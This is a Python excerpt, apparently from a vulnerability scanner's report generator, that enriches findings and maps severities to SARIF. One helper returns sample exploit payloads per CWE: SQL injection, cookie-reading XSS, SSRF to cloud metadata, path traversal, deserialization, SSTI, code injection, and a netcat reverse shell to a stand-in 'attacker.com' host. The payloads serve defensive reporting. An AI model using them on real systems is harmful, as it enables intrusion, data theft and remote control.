        dv_by_vuln: dict[str, Any] = {}
        for dv in dv_results:
            vt = dv.get("vuln_type", "")
            if vt:
                # Keep the most confident confirmed result
                existing = dv_by_vuln.get(vt)
                if (
                    existing is None
                    or dv.get("updated_confidence", 0)
                    > existing.get("updated_confidence", 0)
                ):
                    dv_by_vuln[vt] = dv

        # Enrich each finding
        for f in findings:
            # Try to match with a hypothesis via source+sink+cwe
            src = getattr(f, "source_location", "")
            sink = getattr(f, "sink_location", "")
            cwe = getattr(f, "cwe_id", "")
            category = getattr(f, "category", "")
            vuln_type = category.split(",")[0].strip() if category else ""

            # Build candidate keys ordered by specificity
            keys_to_try: list[str] = []
            if src and sink and vuln_type:
                keys_to_try.append(f"{src}|{sink}|{vuln_type}")
            if src and sink and cwe:
                keys_to_try.append(f"{src}|{sink}|{cwe}")
            if src and sink:
                # Partial match: any vuln_type at this location
                for k in hyp_by_key:
                    if k.startswith(f"{src}|{sink}|"):
                        keys_to_try.append(k)

            matched_hyp = None
            for k in keys_to_try:
                if k in hyp_by_key:
                    matched_hyp = hyp_by_key[k]
                    break

            if matched_hyp is not None:
                # Attach validation verdict
                hid = getattr(matched_hyp, "id", "")
                val = val_by_hyp.get(hid)
                if val is not None:
                    f.validation_verdict = getattr(val, "verdict", "")
                    f.validation_confidence = getattr(val, "confidence", 0.0)

                # Fill in empty enriched fields from hypothesis.
                # source_location/sink_location are now populated at Finding
                # creation time (in _annotated_to_findings), so these
                # normally won't fire — kept as safety fallbacks.
                if not getattr(f, "cwe_id", ""):
                    f.cwe_id = getattr(matched_hyp, "cwe_id", "")
                if not getattr(f, "source_location", ""):
                    f.source_location = getattr(matched_hyp, "source_location", "")
                if not getattr(f, "sink_location", ""):
                    f.sink_location = getattr(matched_hyp, "sink_location", "")
                # Note: endpoint/http_method/http_params are NOT populated from
                # Hypothesis (the dataclass doesn't carry those fields).
                # They must be filled from framework extractor data — TODO.

            # Attach PoC from dynamic verification
            vuln_type = vuln_type or getattr(f, "category", "")
            if vuln_type and not getattr(f, "poc", ""):
                dv = dv_by_vuln.get(vuln_type)
                if dv is not None:
                    poc_code = dv.get("poc_code", "")
                    if poc_code:
                        f.poc = poc_code

            # Fill impact from template if empty
            if not getattr(f, "impact", ""):
                vt = vuln_type or ""
                if vt:
                    from hyqagent.report.templates import lookup_impact

                    f.impact = lookup_impact(vt)

        return findings

    @staticmethod
    def _format_duration(ms: int) -> str:
        """Format a duration in milliseconds to a human-readable string."""
        if ms < 1000:
            return f"{ms}ms"
        seconds = ms / 1000
        if seconds < 60:
            return f"{seconds:.1f}s"
        minutes = int(seconds // 60)
        secs = int(seconds % 60)
        return f"{minutes}m {secs}s"

    @staticmethod
    def _resolve_version() -> str:
        """Resolve the installed package version, defaulting to ``0.1.0``."""
        try:
            import importlib.metadata

            return importlib.metadata.version("hyqagent")
        except importlib.metadata.PackageNotFoundError:
            return "0.1.0"

    @staticmethod
    def _timestamp() -> str:
        """ISO-8601 UTC timestamp for the report."""
        from datetime import datetime

        return datetime.now(UTC).isoformat()


# ── Payload helpers ────────────────────────────────────────────────────────


def _payload_for_vuln(cwe_id: str, vuln_type: str) -> tuple[str, str]:
    """Return a (payload, description) pair for a given CWE / vuln type.

    Used by :meth:`ReportGenerator._build_exploitation_steps` to auto-generate
    realistic exploit payloads for the finding.
    """
    # Try CWE-based matching first (more specific)
    if "CWE-89" in (cwe_id or ""):
        return (
            "1' OR '1'='1' --",
            "构造 SQL 注入 payload：使用 `' OR '1'='1' --` 绕过认证，"
            "或 `' UNION SELECT ... --` 跨表提取数据",
        )
    if "CWE-79" in (cwe_id or ""):
        return (
            "<script>alert(document.cookie)</script>",
            "构造 XSS payload：使用 `<script>alert(document.cookie)</script>` "
            "验证脚本注入，或 `<img src=x onerror=...>` 利用事件处理器执行代码",
        )
    if "CWE-918" in (cwe_id or ""):
        return (
            "http://169.254.169.254/latest/meta-data/",
            "构造 SSRF payload：将目标 URL 参数替换为内部服务地址"
            "（如 AWS IMDS `http://169.254.169.254/latest/meta-data/`）",
        )
    if "CWE-78" in (cwe_id or "") or "CWE-77" in (cwe_id or ""):
        return (
            "; cat /etc/passwd",
            "构造命令注入 payload：使用 `;`, `|`, `&&` 分隔符注入系统命令，"
            "如 `; cat /etc/passwd` 或 `| nc attacker.com 4444 -e /bin/sh`",
        )
    if "CWE-22" in (cwe_id or ""):
        return (
            "../../etc/passwd",
            "构造路径遍历 payload：使用 `../` 序列跳出预期目录，"
            "如 `../../etc/passwd` 读取系统文件",
        )
    if "CWE-502" in (cwe_id or ""):
        return (
            "rO0AB... (base64-encoded serialized object)",
            "构造反序列化 payload：使用 ysoserial 生成恶意序列化对象，"
            "如 `java -jar ysoserial.jar CommonsCollections6 'cmd' | base64`",
        )
    if "CWE-1336" in (cwe_id or ""):
        return (
            "{{7*7}}",
            "构造 SSTI payload：使用 `{{7*7}}` 测试模板注入，"
            "若输出 49 则确认漏洞存在",
        )
    if "CWE-94" in (cwe_id or ""):
        return (
            "__import__('os').system('id')",
            "构造代码注入 payload：注入可执行的表达式或语句，"
            "如 `__import__('os').system('id')`",
        )

    # Fallback: match by vuln_type string
    vt = vuln_type.lower().strip()
    if "sql" in vt:
        return (
            "1' OR '1'='1' --",
            "构造 SQL 注入 payload：使用 OR-based 注入测试查询逻辑漏洞",
        )
    if "xss" in vt:
        return (
            "<script>alert(1)</script>",
            "构造 XSS payload：使用最基本的脚本注入测试输出编码",
        )
    if "ssrf" in vt:
        return (
            "http://localhost:8080/",
            "构造 SSRF payload：将目标 URL 替换为内部地址"
            "（如 localhost 或内网 IP）",
        )
    if "path" in vt or "traversal" in vt:
        return (
            "../../etc/passwd",
            "构造路径遍历 payload：使用 `../` 尝试访问预期外的文件系统路径",
        )
    if "command" in vt or "injection" in vt:
        return (
            "; id",
            "构造命令注入 payload：使用 shell 元字符注入系统命令",
        )

    return ("<malicious input>", "构造针对此漏洞类型的恶意输入")


# ── SARIF helpers ────────────────────────────────────────────────────────


def _sarif_level(severity: str) -> str:
    """Map HyqAgent severity to SARIF `result.level`."""
    return {
        "critical": "error",
        "high": "error",
        "medium": "warning",
        "low": "note",
    }.get(severity, "warning")


def _severity_score(severity: str) -> float:
    """Map severity string to the 0-10 `security-severity` float."""
    return {
        "critical": 9.5,
        "high": 7.5,
        "medium": 5.0,
        "low": 2.5,
    }.get(severity, 5.0)
